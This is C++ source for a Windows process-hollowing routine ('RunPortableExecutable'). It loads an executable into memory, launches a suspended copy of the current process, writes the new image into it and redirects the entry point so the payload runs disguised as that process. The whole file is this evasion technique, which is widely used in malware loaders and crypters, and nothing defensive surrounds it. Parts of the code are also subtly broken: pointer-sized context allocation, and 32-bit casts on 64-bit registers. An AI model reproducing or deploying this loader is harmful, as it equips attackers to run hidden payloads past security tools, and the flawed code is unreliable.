#include <fstream> // Standard C++ library for console I/O
#include <string> // Standard C++ Library for string manip

#define WIN32_LEAN_AND_MEAN
#include <Windows.h> // WinAPI Header
#include <TlHelp32.h> //WinAPI Process API

namespace util
{
	// use this if you want to read the executable from disk
	HANDLE MapFileToMemory(LPCSTR filename)
	{
		std::streampos size;
		std::fstream file(filename, std::ios::in | std::ios::binary | std::ios::ate);
		if (file.is_open())
		{
			size = file.tellg();

			auto Memblock = new char[size]();

			file.seekg(0, std::ios::beg);
			file.read(Memblock, size);
			file.close();

			return Memblock;
		}
		return nullptr;
	}

	BOOLEAN RunPortableExecutable(void* image)
	{
		IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
		IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
		IMAGE_SECTION_HEADER* SectionHeader;

		PROCESS_INFORMATION PI;
		STARTUPINFOA SI;

		CONTEXT* CTX;

		DWORD* ImageBase; //Base address of the image
		void* pImageBase; // Pointer to the image base

		int count;
		char CurrentFilePath[1024];

		DOSHeader = static_cast<PIMAGE_DOS_HEADER>(image); // Initialize Variable
		NtHeader = PIMAGE_NT_HEADERS(DWORD(image) + DOSHeader->e_lfanew); // Initialize

		GetModuleFileNameA(nullptr, CurrentFilePath, 1024); // path to current executable

		if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
		{
			ZeroMemory(&PI, sizeof(PI)); // Null the memory
			ZeroMemory(&SI, sizeof(SI)); // Null the memory

			if (CreateProcessA(CurrentFilePath, nullptr, nullptr, nullptr, FALSE,
			                   CREATE_SUSPENDED, nullptr, nullptr, &SI, &PI)) // Create a new instance of current
			//process in suspended state, for the new image.
			{
				// Allocate memory for the context.
				CTX = static_cast<LPCONTEXT>(VirtualAlloc(nullptr, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
				CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

				if (GetThreadContext(PI.hThread, CTX)) //if context is in thread
				{
					// Read instructions
					ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Rbx + 8), &ImageBase, 4, nullptr);

					pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					                            NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

					// Write the image to the process
					WriteProcessMemory(PI.hProcess, pImageBase, image, NtHeader->OptionalHeader.SizeOfHeaders, nullptr);

					for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
					{
						SectionHeader = PIMAGE_SECTION_HEADER(DWORD(image) + DOSHeader->e_lfanew + 248 + (count * 40));

						WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
						                   LPVOID(DWORD(image) + SectionHeader->PointerToRawData),
						                   SectionHeader->SizeOfRawData, nullptr);
					}
					WriteProcessMemory(PI.hProcess, LPVOID(CTX->Rbx + 8),
					                   &NtHeader->OptionalHeader.ImageBase, 4, nullptr);

					// Move address of entry point to the eax register
					CTX->Rax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
					SetThreadContext(PI.hThread, CTX); // Set the context
					ResumeThread(PI.hThread); //´Start the process/call main()

					return TRUE; // Operation was successful.
				}
			}
		}

		return FALSE;
	}
}
